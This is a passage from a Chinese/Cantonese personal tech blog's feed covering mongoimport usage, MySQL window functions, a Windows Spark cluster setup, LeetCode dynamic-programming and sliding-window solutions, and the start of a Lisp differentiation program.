        <content type="html"><![CDATA[<p>比如我要将 500yinzi.csv 文件导入 yinzi_hangye_db 的 yinzi500 集合:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoimport --host localhost --port <span class="number">27017</span> --db yinzi_hangye_db --collection yinzi500 --<span class="built_in">type</span> csv --file ./500yinzi.csv --fields <span class="built_in">id</span>,listdatestr,stockcode,P0001,P0102,P0203,P0304,P0405,P0506,P0607,P0708,P0809,P0910,P1011,P1112,noteday,contractname,hangye_name</span><br></pre></td></tr></table></figure><p>更多例子:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoimport --host localhost --port <span class="number">40000</span> --db yinzi_hangye_db --collection weight500 --<span class="built_in">type</span> csv --file ./500weight.csv --fields listdatestr,stockcode,contractname,tradedatestr,weight</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoimport --host localhost --port <span class="number">40000</span> --db yinzi_hangye_db --collection stock_fqmininfo2015 --<span class="built_in">type</span> csv --file ./500weight.csv --fields <span class="built_in">id</span>,stockcode,tradedatestr,startprice,maxprice,minprice,endprice,lastdate,profit,lastendprice</span><br></pre></td></tr></table></figure><p>用 <code>--drop</code> 表示如果存在就删除原来的集合(相当于 overwrite), <code>--fields</code> 声明csv的列(当然存进文档里面就变成 key 了),<br><code>--headerline</code> 则指明第一行是列名。<br>踩坑:<br><code>--fields</code>逗号之间不能有空格…  </p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql trick -- windows function. Mysql小技巧:窗口函数</title>
      <link href="/2023/08/17/mysql_over_trick/"/>
      <url>/2023/08/17/mysql_over_trick/</url>
      
        <content type="html"><![CDATA[<p>窗口函数是我最近在做数据分析时学到的小技巧, 下面就写一篇blog记录一下。。。</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>比起熟悉的 group by 操作, 窗口函数的好处就是不会不减少原表的行数, 以及使代码变得更加优雅(bushi)。  </p><p>首先来看看 mysql 窗口函数的语法格式:  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数名（[expr]） <span class="keyword">over</span> 子句</span><br><span class="line"><span class="keyword">over</span> 是关键字，用来指定函数执行的窗口范围</span><br></pre></td></tr></table></figure><p>而子句则有三类:  </p><ul><li><code>partition</code>子句：窗口按照那些字段进行分组，窗口函数在不同的分组上分别执行。</li><li><code>order by</code>子句：按照哪些字段进行排序，窗口函数将按照排序后的记录顺序进行编号。</li><li><code>frame</code>子句：定义子集的规则，通常用来作为滑动窗口使用。</li></ul><p>比如要根据班级进行分组并按年纪进行排序, 使用rank函数计算排名:  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span>,<span class="built_in">rank</span>() <span class="keyword">over</span> (<span class="keyword">partition</span> <span class="keyword">by</span> classname <span class="keyword">order</span> <span class="keyword">by</span> grade <span class="keyword">desc</span>) <span class="keyword">as</span> ranking <span class="keyword">from</span> class;</span><br></pre></td></tr></table></figure><p>比如说要操作 Logs 表连续出现次数至少3次的数字： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span></span><br><span class="line">    p <span class="keyword">as</span> (</span><br><span class="line">    <span class="keyword">select</span> id, num, </span><br><span class="line">    <span class="built_in">lead</span>(num, <span class="number">1</span>) <span class="keyword">over</span> (<span class="keyword">order</span> <span class="keyword">by</span> id) <span class="keyword">as</span> num1, <span class="comment">-- 选求num列当前行后面第1个数字</span></span><br><span class="line">    <span class="built_in">lead</span>(num, <span class="number">2</span>) <span class="keyword">over</span> (<span class="keyword">order</span> <span class="keyword">by</span> id) <span class="keyword">as</span> num2  <span class="comment">-- 选求num列当前行后面第2个数字</span></span><br><span class="line">    <span class="keyword">from</span> Logs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">distinct</span> p.num <span class="keyword">as</span> ConsecutiveNums</span><br><span class="line">        <span class="keyword">from</span> p <span class="keyword">where</span> p.num<span class="operator">=</span>p.num1 <span class="keyword">and</span> p.num1<span class="operator">=</span>p.num2;</span><br></pre></td></tr></table></figure><p>思路是使用 with 语句创建一个运用完窗口函数的临时表 p:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">| <span class="built_in">id</span> | num | num1 | num2 |</span><br><span class="line">| -- | --- | ---- | ---- |</span><br><span class="line">| 1  | 1   | 1    | 1    |</span><br><span class="line">| 2  | 1   | 1    | 2    |</span><br><span class="line">| 3  | 1   | 2    | 1    |</span><br><span class="line">| 4  | 2   | 1    | 2    |</span><br><span class="line">| 5  | 1   | 2    | 2    |</span><br><span class="line">| 6  | 2   | 2    | null |</span><br><span class="line">| 7  | 2   | null | null |</span><br></pre></td></tr></table></figure><p>当然 mysql 支持的窗口函数还有很多, 需要用到的时候就直接查 api 啦。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql trick -- asof_join. 处理时序数据的瑞士军刀</title>
      <link href="/2023/08/17/sql_tricks/asof_join/"/>
      <url>/2023/08/17/sql_tricks/asof_join/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cluster on windows with spark. 用Spark搭建人生第一个Windows集群</title>
      <link href="/2023/07/19/spark_bug_mark1/"/>
      <url>/2023/07/19/spark_bug_mark1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>身为兼职量化交易开发者, 如果以后要处理TB级别的交易数据, 单机运行就太弱鸡了, 这时候就要上Spark集群了.  </p><p>在 Spark 上有很多集群的模式, 其中 Spark 自带就是 Standalone 模式.<br>咩系集群? 即系配置一堆电脑计算同一件任务.<br>反正公司大把电脑(肉机)…</p><p>Standalone模式将各台电脑分成两种角色 – Master(大佬) 和 Worker(马仔)<br>也就是 Master 可以给各个 Worker 分配任务, 而 Master 自己又可以揸刀劈友(运行计算), 这就形成了一股强大的算力.  </p><h1 id="Step1-设置-Master"><a href="#Step1-设置-Master" class="headerlink" title="Step1: 设置 Master"></a>Step1: 设置 Master</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-class org.apache.spark.deploy.master.Master</span><br></pre></td></tr></table></figure><p>结果会出现 <code>spark://ip:port</code> 为 Master 的地址, 设置 Worker 时需用到.</p><h1 id="Step2-设置-Worker"><a href="#Step2-设置-Worker" class="headerlink" title="Step2: 设置 Worker"></a>Step2: 设置 Worker</h1><p>在另外一台电脑上设置其为 <code>Worker</code>, 用 Master:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-class org.apache.spark.deploy.worker.Worker spark://ip:port</span><br></pre></td></tr></table></figure><h1 id="Step3-提交"><a href="#Step3-提交" class="headerlink" title="Step3: 提交"></a>Step3: 提交</h1><p>在 master 机中提交写好嘅程序:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-submit --master spark://ip:port examples/src/main/python/pi.py 1000</span><br></pre></td></tr></table></figure><p>在 Master 机用浏览器打开 <a href="http://localhost:8080/">http://localhost:8080</a> 可以看到集群计算运行的情况</p><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>spark-submit 提交 python 时没有反应.<br>解决方法: 在 windows 里面要在 python 安装路径中创建python3副本(复制 python.exe 为 python3.exe)<br>在 windows 中 spark-submit 提交 jar 包命令时不要带 –jars</p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms training - Linear DP. 算法训练(三) 线性DP.</title>
      <link href="/2022/09/08/alog/linear_dp/"/>
      <url>/2022/09/08/alog/linear_dp/</url>
      
        <content type="html"><![CDATA[<p>我嘅理解: <code>线性DP</code>就是用 for 循环实现的 dp, 不依赖于任何嘅数据结构.  </p><p><a href="https://leetcode.cn/problems/extra-characters-in-a-string/">https://leetcode.cn/problems/extra-characters-in-a-string/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minExtraChar</span>(<span class="params">self, s: <span class="built_in">str</span>, dictionary: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        d = <span class="built_in">set</span>(dictionary)</span><br><span class="line">        f = [<span class="number">0</span>] * (n + <span class="number">1</span>) <span class="comment"># f[i] 表示 [0, i - 1] 嘅结果</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">            f[i] = f[i - <span class="number">1</span>] + <span class="number">1</span> <span class="comment"># 唔选</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>): <span class="comment"># 睇下前面选边个</span></span><br><span class="line">                <span class="keyword">if</span> s[j - <span class="number">1</span> : i] <span class="keyword">in</span> d:</span><br><span class="line">                    f[i] = <span class="built_in">min</span>(f[i], f[j - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> f[n]</span><br></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/find-the-substring-with-maximum-cost/">https://leetcode.cn/problems/find-the-substring-with-maximum-cost/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maximumCostSubstring</span>(<span class="params">self, s: <span class="built_in">str</span>, chars: <span class="built_in">str</span>, vals: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        mapping = <span class="built_in">dict</span>(<span class="built_in">zip</span>(chars, vals))</span><br><span class="line">        f = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">            a = mapping.get(s[i - <span class="number">1</span>], <span class="built_in">ord</span>(s[i - <span class="number">1</span>]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">1</span>)</span><br><span class="line">            f[i] = a <span class="comment"># 唔接力</span></span><br><span class="line">            f[i] = <span class="built_in">max</span>(f[i], <span class="built_in">max</span>(f[i - <span class="number">1</span>], <span class="number">0</span>) + a) <span class="comment"># 接力</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(f) <span class="comment"># 注意系整个数组的最大值</span></span><br></pre></td></tr></table></figure><h1 id="2547-Minimum-Cost-to-Split-an-Array"><a href="#2547-Minimum-Cost-to-Split-an-Array" class="headerlink" title="2547. Minimum Cost to Split an Array"></a>2547. Minimum Cost to Split an Array</h1><p><a href="https://leetcode.cn/problems/minimum-cost-to-split-an-array/">https://leetcode.cn/problems/minimum-cost-to-split-an-array/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minCost</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        f = [<span class="number">0x3f3f3f3f</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n+<span class="number">1</span>)]</span><br><span class="line">        f[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">            cnt = Counter()</span><br><span class="line">            s = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                cnt[nums[j]] += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (cnt[nums[j]] == <span class="number">2</span>):</span><br><span class="line">                    s += <span class="number">2</span></span><br><span class="line">                <span class="keyword">elif</span> cnt[nums[j]] &gt; <span class="number">2</span>:</span><br><span class="line">                    s += <span class="number">1</span></span><br><span class="line">                f[i] = <span class="built_in">min</span>(f[i], f[j] + k + s)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f[n]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> alog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms training - DP on trees. 算法训练(二) 树上DP.</title>
      <link href="/2022/09/02/alog/dp_on_tree/"/>
      <url>/2022/09/02/alog/dp_on_tree/</url>
      
        <content type="html"><![CDATA[<p>咩系树上DP? 其实都没咩可解释嘅. 即系在树上嘅每个节点表示状态, 然后推导状态转移方程.<br>正经D讲, 套路就是先”递”后”归”, 在”归”的过程中进行状态转移. 所以一般都是后序遍历的模板.</p><h1 id="二叉树中的最大路径和"><a href="#二叉树中的最大路径和" class="headerlink" title="二叉树中的最大路径和"></a>二叉树中的最大路径和</h1><p><a href="https://leetcode.cn/problems/binary-tree-maximum-path-sum/">https://leetcode.cn/problems/binary-tree-maximum-path-sum/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxPathSum</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ans = -inf</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">            <span class="keyword">nonlocal</span> ans</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            left = <span class="built_in">max</span>(<span class="number">0</span>, dfs(root.left))</span><br><span class="line">            right = <span class="built_in">max</span>(<span class="number">0</span>, dfs(root.right))</span><br><span class="line"></span><br><span class="line">            ans = <span class="built_in">max</span>(ans, left + right + root.val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + root.val</span><br><span class="line">        </span><br><span class="line">        dfs(root)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="二叉树的直径"><a href="#二叉树的直径" class="headerlink" title="二叉树的直径"></a>二叉树的直径</h1><p><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">https://leetcode.cn/problems/diameter-of-binary-tree/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">            <span class="keyword">nonlocal</span> ans</span><br><span class="line">            <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line"></span><br><span class="line">            ans = <span class="built_in">max</span>(ans, left + right + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> ans - <span class="number">1</span> <span class="comment"># 链的长度 = 节点数目 - 1</span></span><br></pre></td></tr></table></figure><h1 id="打家劫舍III"><a href="#打家劫舍III" class="headerlink" title="打家劫舍III"></a>打家劫舍III</h1><p><a href="https://leetcode.cn/problems/house-robber-iii/">https://leetcode.cn/problems/house-robber-iii/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rob</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="meta">        @cache</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            l_rob, l_nrob = dfs(root.left)</span><br><span class="line">            r_rob, r_nrob = dfs(root.right)</span><br><span class="line"></span><br><span class="line">            rob = l_nrob + r_nrob + root.val <span class="comment"># 偷</span></span><br><span class="line">            nrob = <span class="built_in">max</span>(l_rob, l_nrob) + <span class="built_in">max</span>(r_rob, r_nrob) <span class="comment"># 唔偷</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rob, nrob</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dfs(root))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> alog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms training - Sliding window algorithm. 算法训练(一) 滑动窗口.</title>
      <link href="/2022/08/24/alog/sliding_window/"/>
      <url>/2022/08/24/alog/sliding_window/</url>
      
        <content type="html"><![CDATA[<p>讲起滑动窗口呢, 最紧要就系<code>套模板</code>, 优点系可以将 O(n^2) 或更高时间复杂度降低到 O(n).<br>呢个系在 csdn 上抄落来嘅, 仅供参考:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">findSubArray</span>(<span class="params">nums</span>):</span><br><span class="line">    N = <span class="built_in">len</span>(nums) <span class="comment"># 数组/字符串长度</span></span><br><span class="line">    left, right = <span class="number">0</span>, <span class="number">0</span> <span class="comment"># 双指针，表示当前遍历的区间[left, right]，闭区间</span></span><br><span class="line">    sums = <span class="number">0</span> <span class="comment"># 用于统计 子数组/子区间 是否有效，根据题目可能会改成求和/计数</span></span><br><span class="line">    res = <span class="number">0</span> <span class="comment"># 保存最大的满足题目要求的 子数组/子串 长度</span></span><br><span class="line">    <span class="keyword">while</span> right &lt; N: <span class="comment"># 当右边的指针没有搜索到 数组/字符串 的结尾</span></span><br><span class="line">        sums += nums[right] <span class="comment"># 增加当前右边指针的数字/字符的求和/计数</span></span><br><span class="line">        <span class="keyword">while</span> 区间[left, right]不符合题意：<span class="comment"># 此时需要一直移动左指针，直至找到一个符合题意的区间</span></span><br><span class="line">            sums -= nums[left] <span class="comment"># 移动左指针前需要从counter中减少left位置字符的求和/计数</span></span><br><span class="line">            left += <span class="number">1</span> <span class="comment"># 真正的移动左指针，注意不能跟上面一行代码写反</span></span><br><span class="line">        <span class="comment"># 到 while 结束时，我们找到了一个符合题意要求的 子数组/子串</span></span><br><span class="line">        res = <span class="built_in">max</span>(res, right - left + <span class="number">1</span>) <span class="comment"># 需要更新结果</span></span><br><span class="line">        right += <span class="number">1</span> <span class="comment"># 移动右指针，去探索新的区间</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h1 id="找出最长等值子数组"><a href="#找出最长等值子数组" class="headerlink" title="找出最长等值子数组"></a>找出最长等值子数组</h1><p>给你一个下标从 0 开始的整数数组 nums 和一个整数 k 。</p><p>如果子数组中所有元素都相等，则认为子数组是一个 等值子数组 。注意，空数组是等值子数组  </p><p>从 nums 中删除最多 k 个元素后，返回可能的最长等值子数组的长度。  </p><p>子数组 是数组中一个连续且可能为空的元素序列。  </p><p>输入：nums = [1,3,2,3,1,3], k = 3  </p><p>输出：3  </p><p>解释：最优的方案是删除下标 2 和下标 4 的元素。 删除后，nums 等于 [1, 3, 3, 3] 。 最长等值子数组从 i = 1 开始到 j = 3 结束，长度等于 3 。 可以证明无法创建更长的等值子数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestEqualSubarray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">0</span></span><br><span class="line">        res = -<span class="number">1</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        mp = Counter()</span><br><span class="line">        max_fre = <span class="number">0</span> <span class="comment"># 历史最大长度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> right &lt; n:</span><br><span class="line">            mp[nums[right]]+=<span class="number">1</span></span><br><span class="line">            max_fre = <span class="built_in">max</span>(max_fre, mp[nums[right]])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((right - left + <span class="number">1</span>) - max_fre &gt; k):</span><br><span class="line">                mp[nums[left]]-=<span class="number">1</span></span><br><span class="line">                left+=<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            res = <span class="built_in">max</span>(res, max_fre)</span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> alog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Create a derivation program in lisp. 用 Lisp 写个求导程序</title>
      <link href="/2021/03/17/derivation_program_in_lisp/"/>
      <url>/2021/03/17/derivation_program_in_lisp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记得之前看tensorflow, numpy等库的api中提供了自动求导的函数, 觉得其中一定是用了某些高深的数值分析算法，但在 sicp书中也给了个简单的求导程序, 本质是基于求导法则的递归性质来实现的， 感觉有点意思记录一下。</p><p>我们先来看看求导法则:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dc / dx = 0</span><br><span class="line">dx / dx = 1</span><br><span class="line">d(u + v) / dx = <span class="built_in">du</span>/dx + dv/dx</span><br><span class="line">d(uv)/dx = u(dv/dx) + v(<span class="built_in">du</span>/dv)</span><br></pre></td></tr></table></figure><p>可以看到最后两条求导法则满足递归的性质, 求导的运算过程通过分解后会得到越来越小的片段，最终将产生出常量和变量, 他们的导数都是0或者1.</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>首先我们定义谓语(返回值为bool的函数):  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">variable</span>? x) (<span class="name">symbol</span>? x)) <span class="comment">;判断是否为变量</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">same-variable</span>? v1 v2) <span class="comment">; 是否为同一变量?</span></span><br><span class="line">    (<span class="name">and</span> (<span class="name">variable</span>? v1) (<span class="name">variable</span>? v2) (<span class="name">eq</span>? v1 v2)))</span><br><span class="line"></span><br><span 